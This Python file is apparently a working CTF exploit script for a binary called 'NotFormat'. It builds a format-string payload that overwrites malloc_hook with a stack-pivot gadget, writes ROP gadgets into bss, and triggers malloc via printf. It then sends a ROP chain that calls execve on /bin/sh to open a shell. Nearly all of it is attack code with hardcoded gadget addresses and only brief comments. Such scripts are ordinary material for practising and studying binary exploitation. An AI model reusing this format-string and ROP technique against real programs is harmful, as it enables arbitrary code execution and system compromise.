# File: exp.py
# Author: raycp
# Date: 2019-06-08
# Description: exp for NotFormat, trigger malloc by printf

from pwn_debug import *


pdbg=pwn_debug("./NotFormat")

pdbg.context.terminal=['tmux', 'splitw', '-h']

#pdbg.local()
pdbg.debug("2.27")
#pdbg.remote('127.0.0.1', 22)
#p=pdbg.run("local")
#p=pdbg.run("remote")
p=pdbg.run("debug")

membp=pdbg.membp
#print hex(membp.elf_base),hex(membp.libc_base)
elf=pdbg.elf
libc=pdbg.libc

#io_file=IO_FILE_plus()
#io_file.show()



def pwn():
    
    #pdbg.bp([0x400BCC,0x41E92D])

    ## fromat to overwrite malloc hook and write gadget to bss
    ## then trigger malloc to execute stack povit and execute rop to read data to bss
    ## execute rop chain to get shell.
    
    p.recvuntil("Have fun!")

    malloc_hook= 0x6CB788
    stack_povit=0x4B95D8
    fake_rsp=0x6ccc10 
    read_func=0x400AEE
    prdi_ret=0x00000000004005d5 #: pop rdi ; ret
    prsi_ret = 0x00000000004017f7 #: pop rsi ; ret
    prax_ret = 0x00000000004c2358 #: pop rax ; ret
    prdx_prsi_ret = 0x0000000000442c69 #: pop rdx ; pop rsi ; ret

    syscall_ret = 0x00000000004683d5 #: syscall ; ret

    #pdbg.bp(syscall_ret)
    fmt_write={}
    fmt_write[malloc_hook]=stack_povit&0xffff
    fmt_write[malloc_hook+2]=(stack_povit>>16)&0xffff
    fmt_write[fake_rsp]=prdi_ret&0xffff
    fmt_write[fake_rsp+2]=(prdi_ret>>16)&0xffff
    fmt_write[fake_rsp+8]=(fake_rsp+0x18)&0xffff
    fmt_write[fake_rsp+10]=((fake_rsp+0x18)>>16)&0xffff
    fmt_write[fake_rsp+0x10]=read_func&0xffff
    fmt_write[fake_rsp+0x12]=(read_func>>16)&0xfffff

    tmp_payload=pdbg.fmtstr_hn_payload(6,fmt_write)

    tmp_payload+="%%%dc"%(fake_rsp-0x20)

    padlen=8-(len(tmp_payload)%8)
    padlen+=0x8
    tmp_payload+='a'*padlen
    payload_len=len(tmp_payload)

    index=payload_len/8
    payload=pdbg.fmtstr_hn_payload(6+index,fmt_write)
    payload+="%%%dc"%(fake_rsp-0x20)
    payload=payload.ljust(payload_len,'a')
    for where,what in fmt_write.items():
        payload+=p64(where)

    log.info("fmt len: %s"%(hex(len(payload))))
    p.sendline(payload)

    raw_input("rop chain>")
    
    payload=p64(prdi_ret)+p64(fake_rsp+0x60)+p64(prdx_prsi_ret)+p64(0)+p64(0)+p64(prax_ret)+p64(0x3b)+p64(syscall_ret)
    payload+='/bin/sh\x00'*0x6

    p.sendline(payload)
    p.interactive() 

if __name__ == '__main__':
    pwn()


